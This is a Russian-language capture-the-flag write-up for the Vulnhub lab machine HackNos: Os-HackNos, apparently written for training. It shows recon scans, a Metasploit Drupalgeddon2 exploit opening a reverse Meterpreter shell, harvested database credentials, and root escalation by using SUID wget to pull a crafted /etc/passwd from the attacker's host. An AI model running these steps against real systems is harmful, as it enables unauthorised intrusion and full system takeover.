# HackNos: Os-HackNos
## Vulnhub machine

- Название: HackNos: Os-HackNos  
- OS: Linux
- Ресурс: Vulnhub
- Сложность: Easy to Intermediate
- Дата релиза: 27.11.19
- Оригинальное описание: 
>Difficulty : Easy to Intermediate
Flag : 2 Flag first user And second root
Learning : exploit | Web Application | Enumeration | Privilege Escalation
Website : www.hackNos.com
mail : contact@hackNos.com

## Write-up

```html
┌─[root@parrot]─[/home/user/Desktop]
└──╼ #nmap -p- -A 192.168.56.126
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-26 05:29 AKDT
Nmap scan report for 192.168.56.126
Host is up (0.00080s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a5:a5:17:70:4d:be:48:ad:ba:64:c1:07:a0:55:03:ea (RSA)
|   256 f2:ce:42:1c:04:b8:99:53:95:42:ab:89:22:66:9e:db (ECDSA)
|_  256 4a:7d:15:65:83:af:82:a3:12:02:21:1c:23:49:fb:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 08:00:27:00:C5:82 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.80 ms 192.168.56.126

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.68 seconds
```

>Классика CTF, 80 и 22 порты.

```html 
┌─[root@parrot]─[/home/user/Desktop]
└──╼ #dirb http://192.168.56.126/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue May 26 05:30:04 2020
URL_BASE: http://192.168.56.126/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.126/ ----
==> DIRECTORY: http://192.168.56.126/drupal/                                           
+ http://192.168.56.126/index.html (CODE:200|SIZE:11321)                                     
+ http://192.168.56.126/server-status (CODE:403|SIZE:279)                                    
                                                                                             
---- Entering directory: http://192.168.56.126/drupal/ ----
==> DIRECTORY: http://192.168.56.126/drupal/includes/                                        
+ http://192.168.56.126/drupal/index.php (CODE:200|SIZE:7687)                                
==> DIRECTORY: http://192.168.56.126/drupal/misc/                                            
==> DIRECTORY: http://192.168.56.126/drupal/modules/                                         
==> DIRECTORY: http://192.168.56.126/drupal/profiles/                                        
+ http://192.168.56.126/drupal/robots.txt (CODE:200|SIZE:2189)                               
==> DIRECTORY: http://192.168.56.126/drupal/scripts/                                         
==> DIRECTORY: http://192.168.56.126/drupal/sites/                                           
==> DIRECTORY: http://192.168.56.126/drupal/themes/                                          
+ http://192.168.56.126/drupal/web.config (CODE:200|SIZE:2200)                               
+ http://192.168.56.126/drupal/xmlrpc.php (CODE:200|SIZE:42)                                 
                                                                                             
---- Entering directory: http://192.168.56.126/drupal/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                             
---- Entering directory: http://192.168.56.126/drupal/misc/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                             
---- Entering directory: http://192.168.56.126/drupal/modules/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                             
---- Entering directory: http://192.168.56.126/drupal/profiles/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                             
---- Entering directory: http://192.168.56.126/drupal/scripts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                             
---- Entering directory: http://192.168.56.126/drupal/sites/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                             
---- Entering directory: http://192.168.56.126/drupal/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Tue May 26 05:30:18 2020
DOWNLOADED: 9224 - FOUND: 6
```

>Используется CMS Drupal, посмотрим его версию:

```html
┌─[user@parrot]─[~]
└──╼ $wig -m http://192.168.56.126/drupal/

wig - WebApp Information Gatherer


Scanning http://192.168.56.126/drupal/...
_________________________________ SITE INFO _________________________________
IP                  Title                                                    
192.168.56.126      Welcome to james | james                               
                                                                             
__________________________________ VERSION __________________________________
Name                Versions                              Type               
Drupal              7                                     CMS                
phpMyAdmin          2                                     CMS                
Apache              2.4.18                                Platform           
jQuery              1.4.4                                 JavaScript         
FreeBSD             10 | 11                               OS                 
openSUSE            tumbleweed                            OS                 
                                                                             
________________________________ INTERESTING ________________________________
URL                 Note                                  Type               
/CHANGELOG.txt      Drupal CHANGELOG                      Interesting        
/phpmyadmin/README  phpMyAdmin readme                     Interesting        
                                                                             
___________________________________ TOOLS ___________________________________
Name                Link                                  Software           
droopescan          https://github.com/droope/droopescan  Drupal             
CMSmap              https://github.com/Dionach/CMSmap     Drupal             
                                                                             
_____________________________________________________________________________
Time: 10.8 sec      Urls: 469                             Fingerprints: 39241
```

>К устаревшей версии наверняка найдется эксплойт, помимо этого dirbuster с листом rockyou.txt обнаружил файл alexander.txt, в котором был зашифрованный пароль:

```html
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4g
KysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0g
LS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysg
KzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysg
Wy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA==
```

>Расшифровываем из base64:

```html
+++++ +++++ [->++ +++++ +++<] >++++ ++.-- ----- --.<+ ++[-> +++<] >+++.
----- ---.< +++[- >+++< ]>+++ ++.<+ +++++ +[->- ----- -<]>- ----- --.<+
++[-> +++<] >++++ +.<++ +++[- >++++ +<]>. ++.++ +++++ +.--- ---.< +++[-
>+++< ]>+++ +.<++ +++++ [->-- ----- <]>-. <+++[ ->--- <]>-- -.+.- ---.+
++.<
```

>И теперь из brainfuck -- https://www.dcode.fr/brainfuck-language
>james:Hacker@4514

>Я пробовал этот пароль к ssh, но не вышло:

```html
┌─[✗]─[root@parrot]─[/home/user/Desktop]
└──╼ #ssh james@192.168.56.126
The authenticity of host '192.168.56.126 (192.168.56.126)' can't be established.
ECDSA key fingerprint is SHA256:hXngPbMM4R/BRWkpJVUWY6uRCJulK86bg2MOzFRgl5s.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.126' (ECDSA) to the list of known hosts.
james@192.168.56.126's password: 
Permission denied, please try again.
```

>Поэтому пробуем использовать устаревшую версию Drupal:

```html
┌─[✗]─[root@parrot]─[/home/user/Desktop]
└──╼ #msfconsole
                                                  
Call trans opt: received. 2-19-98 13:24:18 REC:Loc

     Trace program: running

           wake up, Neo...
        the matrix has you
      follow the white rabbit.

          knock, knock, Neo.

                        (`.         ,-,
                        ` `.    ,;' /
                         `.  ,'/ .'
                          `. X /.'
                .-;--''--.._` ` (
              .'            /   `
             ,           ` '   Q '
             ,         ,   `._    \
          ,.|         '     `-.;_'
          :  . `  ;    `  ` --,.._;
           ' `    ,   )   .'
              `._ ,  '   /_
                 ; ,''-,;' ``-
                  ``-..__``--`

                             https://metasploit.com


       =[ metasploit v5.0.88-dev                          ]
+ -- --=[ 2014 exploits - 1097 auxiliary - 343 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Use sessions -1 to interact with the last opened session

msf5 > search drupal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   1  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   3  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   4  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   5  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
   6  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
```

>После нескольких неудачных попыток, я нашел необходимый:

```html
msf5 > use exploit/unix/webapp/drupal_drupalgeddon2
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.56.126
RHOSTS => 192.168.56.126
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set TARGETURI /drupal
TARGETURI => /drupal
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 192.168.56.119:4444 
[*] Sending stage (38288 bytes) to 192.168.56.126
[*] Meterpreter session 1 opened (192.168.56.119:4444 -> 192.168.56.126:56554) at 2020-05-26 06:16:14 -0800

meterpreter >
```

>Все так же, спавним оболочку и берем первый флаг:

```html
meterpreter > shell
Process 1764 created.
Channel 0 created.
python -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh: 1: python: not found
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@hackNos:/var/www/html/drupal$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@hackNos://home/james$ ls
ls
user.txt
www-data@hackNos://home/james$ cat user.txt
cat user.txt
   _                                  
  | |                                 
 / __) ______  _   _  ___   ___  _ __ 
 \__ \|______|| | | |/ __| / _ \| '__|
 (   /        | |_| |\__ \|  __/| |   
  |_|          \__,_||___/ \___||_|   
                                      
                                      

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
```

>Побродив по директориям я нашел еще один пароль, хоть он и не пригодился:

```html
www-data@hackNos:/var/www/html/drupal/sites/default$ cat settings.php
cat settings.php

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'cuppa',
      'username' => 'cuppauser',
      'password' => 'Akrn@4514',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

>Переходим к вертикальной эскалации:

```html
www-data@hackNos:/var/www/html/drupal/sites/default$ find / -type f -perm -u=s 2>/dev/null
tml/drupal/sites/default$ find / -type f -perm -u=s 2>/dev/null             
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/i386-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/pkexec
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/wget
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/bin/ping6
/bin/umount
/bin/ntfs-3g
/bin/mount
/bin/ping
/bin/su
/bin/fusermount
```

>Я уже описывал этот способ в Ha-Wordy.

```html
┌─[user@parrot]─[~/Desktop]
└──╼ $openssl passwd -1 -salt testuser passwd
$1$testuser$w9w5lMsBLRm73mXHsylOI1
```

>И вписываем новую строку в скопированный passwd:

```html
┌─[user@parrot]─[~/Downloads]
└──╼ $cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
james:x:1000:1000:james,,,:/home/james:/bin/bash
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
testuser:$1$testuser$w9w5lMsBLRm73mXHsylOI1:0:0:root:/root:/bin/bash
```

>Заливаем с заменой, логинимся:

```html
www-data@hackNos://etc$ wget http://192.168.56.119:8000/passwd -O passwd
wget http://192.168.56.119:8000/passwd -O passwd
--2020-05-26 20:05:01--  http://192.168.56.119:8000/passwd
Connecting to 192.168.56.119:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1689 (1.6K) [application/octet-stream]
Saving to: 'passwd'

passwd              100%[===================>]   1.65K  --.-KB/s    in 0s      

2020-05-26 20:05:01 (94.0 MB/s) - 'passwd' saved [1689/1689]

www-data@hackNos://etc$ su testuser
su testuser
Password: passwd

root@hackNos://etc# id
id
uid=0(root) gid=0(root) groups=0(root)
```

>И берем второй флаг:

```html
root@hackNos://root# ls
ls
root.txt
root@hackNos://root# cat root.txt
cat root.txt
    _  _                              _   
  _| || |_                           | |  
 |_  __  _|______  _ __  ___    ___  | |_ 
  _| || |_|______|| '__|/ _ \  / _ \ | __|
 |_  __  _|       | |  | (_) || (_) || |_ 
   |_||_|         |_|   \___/  \___/  \__|
                                          
                                          

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

Author : Rahul Gehlaut

Linkedin : https://www.linkedin.com/in/rahulgehlaut/

Blog : www.hackNos.com
```
